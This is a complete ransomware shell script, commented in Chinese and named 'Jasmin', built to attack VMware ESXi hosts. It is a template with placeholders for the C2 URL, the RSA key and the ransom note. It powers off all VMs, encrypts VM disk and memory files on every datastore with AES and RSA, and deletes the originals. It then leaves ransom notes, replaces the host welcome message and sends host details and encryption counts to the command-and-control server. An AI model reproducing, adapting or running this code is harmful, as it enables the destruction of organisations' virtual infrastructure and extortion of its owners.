#!/bin/sh
# Jasmin ESXi Payload — Auto-generated
# 依赖: openssl wget/curl (ESXi BusyBox sh)
C2='{{C2_URL}}'
SECRET='{{HANDSHAKE}}'
EXTS='vmdk vmx vmem vmsn vmxf nvram vmsd'

# ── RSA公钥 ──
PUB_KEY='{{RSA_PUBLIC_KEY}}'

RANSOM_TXT='{{RANSOM_NOTE}}'

# ────────────────────────────────────────
# 工具函数
# ────────────────────────────────────────
log(){ echo "[jasmin] $*" >&2; }

has_cmd(){ command -v "$1" >/dev/null 2>&1; }

sha256_file(){
    if has_cmd sha256sum; then
        sha256sum "$1" | cut -d' ' -f1
    elif has_cmd openssl; then
        openssl dgst -sha256 "$1" | awk '{print $NF}'
    else
        echo "0000000000000000000000000000000000000000000000000000000000000000"
    fi
}

http_post(){
    # $1=url $2=data
    if has_cmd wget; then
        wget -q -O /dev/null --post-data="$2" "$1" 2>/dev/null
    elif has_cmd curl; then
        curl -s -X POST -d "$2" "$1" >/dev/null 2>&1
    fi
}

http_get(){
    if has_cmd wget; then
        wget -q -O - "$1" 2>/dev/null
    elif has_cmd curl; then
        curl -s "$1" 2>/dev/null
    fi
}

# ────────────────────────────────────────
# 停止所有VM (确保VMDK不被锁定)
# ────────────────────────────────────────
stop_vms(){
    log "停止所有VM..."
    if has_cmd vim-cmd; then
        vim-cmd vmsvc/getallvms 2>/dev/null | awk 'NR>1{print $1}' | while read vmid; do
            vim-cmd vmsvc/power.off "$vmid" 2>/dev/null
            log "  已停止 vmid=$vmid"
        done
    fi
    if has_cmd esxcli; then
        esxcli vm process list 2>/dev/null | grep 'World ID' | awk '{print $NF}' | while read wid; do
            esxcli vm process kill --type=soft --world-id="$wid" 2>/dev/null
        done
    fi
    sleep 2
}

# ────────────────────────────────────────
# 写RSA公钥到临时文件
# ────────────────────────────────────────
write_pubkey(){
    PUBKEY_FILE="/tmp/.jasmin_pub_$$"
    printf '%s\n' "$PUB_KEY" > "$PUBKEY_FILE"
    echo "$PUBKEY_FILE"
}

# ────────────────────────────────────────
# 加密单个文件
# ────────────────────────────────────────
encrypt_file(){
    local FILE="$1"
    local PUBKEY="$2"
    [ -f "$FILE" ] || return 1
    [ -s "$FILE" ] || return 1
    # 已加密跳过
    case "$FILE" in *.jasmin) return 1;; esac

    # 生成随机 AES-256 key(32B) + IV(16B)
    local KEY_HEX IV_HEX
    KEY_HEX=$(openssl rand -hex 32 2>/dev/null) || return 1
    IV_HEX=$(openssl rand -hex 16 2>/dev/null)  || return 1

    local ORIG="$FILE"
    local ENC="${FILE}.jasmin"
    local TMP_CT="/tmp/.jct_$$"
    local TMP_KIV="/tmp/.jkiv_$$"
    local TMP_EK="/tmp/.jek_$$"

    # SHA256原始文件
    local HASH
    HASH=$(sha256_file "$ORIG")

    # AES-256-CBC加密
    openssl enc -aes-256-cbc -nosalt \
        -in "$ORIG" -out "$TMP_CT" \
        -K "$KEY_HEX" -iv "$IV_HEX" 2>/dev/null || { rm -f "$TMP_CT"; return 1; }

    # RSA-OAEP加密 key+iv
    printf '%s%s' "$KEY_HEX" "$IV_HEX" | xxd -r -p > "$TMP_KIV" 2>/dev/null || \
        python -c "import sys;sys.stdout.write(bytes.fromhex('${KEY_HEX}${IV_HEX}').decode('latin-1'))" > "$TMP_KIV" 2>/dev/null

    openssl pkeyutl -encrypt -pubin -inkey "$PUBKEY" \
        -in "$TMP_KIV" -out "$TMP_EK" \
        -pkeyopt rsa_padding_mode:oaep \
        -pkeyopt rsa_oaep_md:sha256 \
        -pkeyopt rsa_mgf1_md:sha256 2>/dev/null || {
        rm -f "$TMP_CT" "$TMP_KIV" "$TMP_EK"
        return 1
    }

    # 组装: [SHA256 32B][密文][RSA加密key块][4B key块长度]
    local EK_LEN
    EK_LEN=$(wc -c < "$TMP_EK")
    # 小端4字节长度
    local LEN_HEX
    LEN_HEX=$(printf '%08x' "$EK_LEN" | sed 's/\(..\)\(..\)\(..\)\(..\)/\4\3\2\1/')

    {
        printf '%s' "$HASH" | xxd -r -p 2>/dev/null || \
            python -c "import sys;sys.stdout.write(bytes.fromhex('$HASH').decode('latin-1'))"
        cat "$TMP_CT"
        cat "$TMP_EK"
        printf '%s' "$LEN_HEX" | xxd -r -p 2>/dev/null || \
            python -c "import sys;sys.stdout.write(bytes.fromhex('$LEN_HEX').decode('latin-1'))"
    } > "$ENC" 2>/dev/null

    rm -f "$TMP_CT" "$TMP_KIV" "$TMP_EK"

    if [ -s "$ENC" ]; then
        rm -f "$ORIG"
        return 0
    else
        rm -f "$ENC"
        return 1
    fi
}

# ────────────────────────────────────────
# 投放勒索信
# ────────────────────────────────────────
drop_notes(){
    local SID="$1"
    local NOTE
    NOTE=$(printf '%s' "$RANSOM_TXT" | sed "s/{sid}/$SID/g")
    # 放到每个数据存储根目录
    for DS in /vmfs/volumes/*; do
        [ -d "$DS" ] || continue
        printf '%s\n' "$NOTE" > "$DS/READ_ME_解密教程.txt" 2>/dev/null
    done
    printf '%s\n' "$NOTE" > /tmp/READ_ME_解密教程.txt 2>/dev/null
    # ESXi欢迎界面
    if has_cmd esxcli; then
        esxcli system welcomemsg set -m "$(printf '%s' "$NOTE" | head -5)" 2>/dev/null
    fi
}

# ────────────────────────────────────────
# 回传C2
# ────────────────────────────────────────
beacon(){
    local SID="$1" COUNT="$2" SIZE="$3" TYPES="$4" DETAIL="$5"
    local HOSTNAME IP OS_VER
    HOSTNAME=$(hostname 2>/dev/null || echo "esxi-host")
    OS_VER=$(uname -r 2>/dev/null || echo "ESXi")
    IP=$(esxcli network ip interface ipv4 get 2>/dev/null | awk '/vmk0/{print $2}' | head -1)
    [ -z "$IP" ] && IP=$(ifconfig vmk0 2>/dev/null | grep 'inet ' | awk '{print $2}')
    [ -z "$IP" ] && IP="0.0.0.0"
    local DATE TIME_STR
    DATE=$(date '+%d/%m/%Y, %A' 2>/dev/null)
    TIME_STR=$(date '+%H:%M:%S' 2>/dev/null)
    local DATA
    DATA="handshake=${SECRET}&machine_name=${HOSTNAME}&computer_user=root&os=ESXi%20${OS_VER}&date=${DATE}&time=${TIME_STR}&ip=${IP}&location=&systemid=${SID}&password=RSA_PROTECTED&encrypted_count=${COUNT}&encrypted_size=${SIZE}&encrypted_types=${TYPES}&encrypted_detail=${DETAIL}"
    http_post "$C2" "$DATA"
}

# ────────────────────────────────────────
# 主流程
# ────────────────────────────────────────
main(){
    # 检查openssl
    has_cmd openssl || { log "缺少openssl，无法运行"; exit 1; }

    local SID
    SID="$(hostname)_$$_$(date +%s)"

    stop_vms

    local PUBKEY
    PUBKEY=$(write_pubkey)

    local COUNT=0 SIZE=0 TYPES="" DETAIL="{"
    local FIRST=1

    # 遍历所有数据存储
    for DS in /vmfs/volumes/*; do
        [ -d "$DS" ] || continue
        # 递归查找目标文件
        find "$DS" -type f 2>/dev/null | while read F; do
            # 检查扩展名
            EXT="${F##*.}"
            MATCH=0
            for E in $EXTS; do
                [ "$EXT" = "$E" ] && MATCH=1 && break
            done
            [ "$MATCH" = "1" ] || continue

            local FSIZE
            FSIZE=$(wc -c < "$F" 2>/dev/null || echo 0)

            if encrypt_file "$F" "$PUBKEY"; then
                COUNT=$((COUNT+1))
                SIZE=$((SIZE+FSIZE))
                # 统计类型
                if ! echo "$TYPES" | grep -q "$EXT"; then
                    TYPES="${TYPES}${TYPES:+,}${EXT}"
                fi
                log "  [+] $F ($FSIZE B)"
            else
                log "  [-] 跳过: $F"
            fi
        done
    done

    # 清理公钥
    rm -f "$PUBKEY"

    drop_notes "$SID"
    beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}"

    log "完成: 加密 $COUNT 个文件，合计 $SIZE 字节"
}

main
